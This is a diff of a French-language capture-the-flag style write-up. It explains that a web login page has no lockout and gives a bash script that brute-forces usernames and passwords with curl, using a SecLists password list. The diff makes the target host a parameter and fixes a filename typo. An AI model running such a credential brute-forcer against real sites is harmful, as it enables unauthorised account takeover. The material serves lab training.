@@ -13,27 +13,27 @@ On observe après plusieurs essais de connexion que le site ne nous **bloque** p
 
 Donc on essaye de se connecter en **Brute Force** avec un script shell :
 ```bash
-#!/bin/bash
-curl -s "http://192.168.1.175/?page=signin&username=qsdqsd&password=qsd&Login=Login#" > trueone
+#!/bin/sh
+curl -s "http://$1/?page=signin&username=qsdqsd&password=qsd&Login=Login#" > trueone
 while IFS='' read -r user; do
-		echo "try user : $user"
-		url1="http://192.168.1.175/?page=signin&username="
-		url2="&password="
-		url3="&Login=Login#"
-		while IFS='' read -r line; do
-				echo "try password: $line"
-				curl -s "$url1$user$url2$line$url3" > tested
-				DIFF=$(diff trueone testee)
-				if [ "$DIFF" != "" ]
-				then
-						cat testee | grep "flag"
-						echo "user is : $user\npassword is $line" >> result.txt
-						rm testee
-						break
-				fi
-				rm testee
-		done < "dict.txt"
-done < "users.txt</code><pre>
+	echo "try user : $user"
+	url1="http://$1/?page=signin&username="
+	url2="&password="
+	url3="&Login=Login#"
+	while IFS='' read -r line; do
+			echo "\ttry password: $line"
+			curl -s "$url1$user$url2$line$url3" > tested
+			DIFF=$(diff trueone tested)
+			if [ "$DIFF" != "" ]
+			then
+					cat tested | grep "flag"
+					echo "user is : $user\npassword is $line" >> result.txt
+					rm tested
+					break
+			fi
+			rm tested
+	done < "dict.txt"
+done < "users.txt"
 ```
 Avec ce **Brute Force**, on utilise un [dictionnaire](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Common-Credentials/10-million-password-list-top-1000.txt) de mot de passe, et un liste d'**users**.
 
